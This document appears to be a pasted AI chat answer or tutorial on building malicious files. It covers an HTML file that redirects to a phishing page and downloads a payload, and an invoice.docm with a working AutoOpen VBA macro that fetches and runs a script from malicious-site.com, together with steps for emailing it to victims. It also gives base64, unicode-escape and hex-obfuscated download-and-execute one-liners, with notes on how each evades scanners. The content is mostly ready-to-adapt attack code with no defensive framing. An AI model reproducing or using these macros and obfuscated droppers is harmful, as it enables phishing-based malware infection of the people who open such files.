report.html
Explanation of the Code

Redirect to a Malicious Website:
The window.location.href line immediately redirects the user to http://malicious-site.com/phishing-page. This page might attempt to steal credentials or install additional malware.
Automatic File Download:
The JavaScript code creates a hidden download link pointing to a malicious script (payload.sh) on a remote server. When the HTML is opened, it automatically downloads the file to the user’s computer.
This download attribute instructs the browser to save the file rather than open it.
Command Execution (Simulated):
The last part attempts to fetch a remote URL with a payload that sends system commands. While most browsers will block such commands, this highlights how attackers might try to abuse JavaScript to trigger remote command execution.

invoice.docm VBA

How Attackers Might Craft invoice.docm
Step 1: Create a New Word Document with a Macro
Attackers would create a Word document (.docm format) in Microsoft Word or another Office-compatible application that supports macros.
They would embed a VBA (Visual Basic for Applications) macro in the document that triggers when the document is opened or when a specific button is clicked.
Step 2: Write the Malicious Macro Code
The macro is written in VBA to download and execute a payload, such as a Bash script, PowerShell command, or other commands.
Here’s a sample VBA macro that would run a PowerShell command to download and execute a remote script:

vba
Copy code
Sub AutoOpen()
    ' This macro runs automatically when the document is opened
    Dim objShell As Object
    Set objShell = CreateObject("WScript.Shell")
    
    ' PowerShell command to download and execute the malicious script
    Dim command As String
    command = "powershell -Command ""(New-Object System.Net.WebClient).DownloadFile('http://malicious-site.com/payload.sh', 'C:\\Users\\Public\\payload.sh'); Start-Process 'C:\\Users\\Public\\payload.sh'"""
    
    ' Run the PowerShell command
    objShell.Run command, 0
End Sub
Explanation of the VBA Code:
AutoOpen() is a special macro name in VBA that runs automatically when the document is opened.
WScript.Shell is used to execute system commands.
The command downloads payload.sh from a malicious server and saves it to the C:\Users\Public\ directory, then executes it.
Step 3: Save the Document as invoice.docm
The attacker saves the document in .docm format, which supports macros (.docx files do not support macros).
The file is then renamed to something that appears legitimate, like invoice.docm.
Step 4: Distribute the Document
The attacker sends the invoice.docm file via email or another method, often with a message encouraging the recipient to enable macros for “full functionality” or to view the “complete document.”
If the user opens the document and enables macros, the malicious code executes.

Obfuscating with Base64 Encoding
An attacker might encode a malicious script in Base64 so that it’s not immediately readable, then use base64 -d (decode) to run the command on the target machine.

Original Malicious Command

Let’s say the attacker’s original command is simple and looks like this:

bash
Copy code
curl -O http://malicious-site.com/malware.sh && bash malware.sh
This command downloads a malicious script from a remote server and executes it.

Base64 Encoded Version

First, the attacker encodes the command in Base64:
bash
Copy code
echo "curl -O http://malicious-site.com/malware.sh && bash malware.sh" | base64
This outputs an encoded string like:

plaintext
Copy code
Y3VybCAtTyBodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL21hbHdhcmUuc2ggJiYgYmFzaCBtYWx3YXJlLnNo
Next, the attacker constructs a Bash script that decodes and runs this command:
bash
Copy code
#!/bin/bash
echo "Y3VybCAtTyBodHRwOi8vbWFsaWNpb3VzLXNpdGUuY29tL21hbHdhcmUuc2ggJiYgYmFzaCBtYWx3YXJlLnNo" | base64 -d | bash
When executed, this script:
Decodes the Base64 string back into the original command.
Pipes it to bash to execute immediately.
Why This Is Effective

Evasion: The command itself is hidden, so static analysis tools may not recognize the script as malicious at first glance.
Execution: The decoded command runs without requiring a separate file, which means there is no intermediate readable script on disk.

Example 2: Obfuscating with JavaScript Character Encoding
For web-based attacks, an attacker might use JavaScript obfuscation techniques, like replacing each character with its Unicode equivalent, to hide malicious JavaScript code within an HTML file.

Original JavaScript Code

Suppose the attacker wants to run the following JavaScript code, which downloads and executes a script:

javascript
Copy code
fetch("http://malicious-site.com/payload.sh")
  .then(response => response.text())
  .then(script => eval(script));
Obfuscated JavaScript Version

Convert each character to its Unicode escape sequence:
javascript
Copy code
var script = "\u0066\u0065\u0074\u0063\u0068\u0028\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u006d\u0061\u006c\u0069\u0063\u0069\u006f\u0075\u0073\u002d\u0073\u0069\u0074\u0065\u002e\u0063\u006f\u006d\u002f\u0070\u0061\u0079\u006c\u006f\u0061\u0064\u002e\u0073\u0068\u0022\u0029\u002e\u0074\u0068\u0065\u006e\u0028\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u0020\u003d\u003e\u0020\u0072\u0065\u0073\u0070\u006f\u006e\u0073\u0065\u002e\u0074\u0065\u0078\u0074\u0028\u0029\u0029\u002e\u0074\u0068\u0065\u006e\u0028\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u003d\u003e\u0020\u0065\u0076\u0061\u006c\u0028\u0073\u0063\u0072\u0069\u0070\u0074\u0029\u0029\u003b";
eval(script);
When executed, this code:
Defines the JavaScript script variable as an obfuscated version of the original fetch command.
Uses eval(script) to interpret and execute the obfuscated string.
Why This Is Effective

Evasion: The JavaScript code is obfuscated, making it harder for human analysts or automated security tools to recognize the purpose of the code at first glance.
Execution on Decoding: When the eval(script) command runs, it decodes the original command and executes it, performing the malicious action.
Example 3: Using Hex Encoding in Bash
Attackers can also use hex encoding to obscure commands in a Bash script, which can be decoded with echo -e.

Original Command

bash
Copy code
wget http://malicious-site.com/malware.sh && bash malware.sh
Hex-Encoded Version

Convert each character to its hex equivalent:
bash
Copy code
echo -e "\\x77\\x67\\x65\\x74\\x20\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x6d\\x61\\x6c\\x69\\x63\\x69\\x6f\\x75\\x73\\x2d\\x73\\x69\\x74\\x65\\x2e\\x63\\x6f\\x6d\\x2f\\x6d\\x61\\x6c\\x77\\x61\\x72\\x65\\x2e\\x73\\x68\\x20\\x26\\x26\\x20\\x62\\x61\\x73\\x68\\x20\\x6d\\x61\\x6c\\x77\\x61\\x72\\x65\\x2e\\x73\\x68" | bash
The command:
Translates the hex-encoded characters back into the original command using echo -e.
Executes the decoded command immediately with bash.
Benefits and Drawbacks

Benefit: Harder for static scanners to detect as the original command is hidden.
Drawback: Certain tools and configurations can flag echo -e with hex strings as suspicious, so this method might be more easily detectable than Base64 encoding.
